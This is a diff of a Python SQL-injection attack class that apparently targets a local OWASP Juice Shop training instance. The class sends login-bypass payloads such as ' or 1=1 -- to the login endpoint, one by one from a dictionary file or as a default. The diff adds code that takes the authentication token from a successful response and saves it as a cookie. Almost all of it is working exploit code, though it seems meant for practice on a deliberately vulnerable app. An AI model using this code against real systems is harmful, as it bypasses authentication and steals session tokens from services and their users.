@@ -1,17 +1,15 @@
 from . import attack as a
-from .header_config import *
-import http.cookiejar as cookielib
 
 class SQL_injector(a.attack_inter):
     def __init__(self, dictionary=None):
         self.dictionary = dictionary
         # First trying to load cookies from local cookie file
         self.juice_session = a.requests.session()
-        self.juice_session.cookies = cookielib.LWPCookieJar(filename="juiceShopCookies.txt")
+        #self.juice_session.cookies = a.cookielib.LWPCookieJar(filename="./juiceShopCookies.txt")
 
     def generator(self, myScript='\' or 1=1 --'):
         #cookies = COOKIE
-        headers = HEADER
+        headers = a.HEADER
 
         json_data = {
             'email': myScript,
@@ -26,24 +24,24 @@ class SQL_injector(a.attack_inter):
             for line in f:
                 line = line.rstrip()
                 headers, json_data = self.generator(line)
-
-                response = self.juice_session.post('http://localhost:3000/rest/user/login', headers=headers, json=json_data, verify=False)
+                response = self.juice_session.post('http://localhost:3000/rest/user/login', json=json_data, verify=False)
                 if response.status_code == 200:
                     res_payload_dict = response.json()
                     print("Valid script: ", json_data['email'])
                     print(res_payload_dict)
-                    self.juice_session.cookies.save()
+                    #self.juice_session.cookies.save()
                     break
         else:
             headers, json_data = self.generator()
-            response = self.juice_session.post('http://localhost:3000/rest/user/login', headers=headers, json=json_data, verify=False)
+            response = self.juice_session.post('http://localhost:3000/rest/user/login', json=json_data)
             if response.status_code == 200:
                 res_payload_dict = response.json()
                 print("Valid script: ", json_data['email'])
                 print(res_payload_dict)
-                self.juice_session.cookies.save(filename="juiceShopCookies.txt")
                 
-                # routeUrl = "http://localhost:3000/#/administration"
-                # newres= self.juice_session.get(routeUrl, timeout=30)
-                # print(newres.content)
-            
+                new_token = res_payload_dict["authentication"]['token']
+                print(new_token)
+
+                new_cookie = a.COOKIE
+                new_cookie["token"] = new_token
+                a.write_cookie(new_cookie)
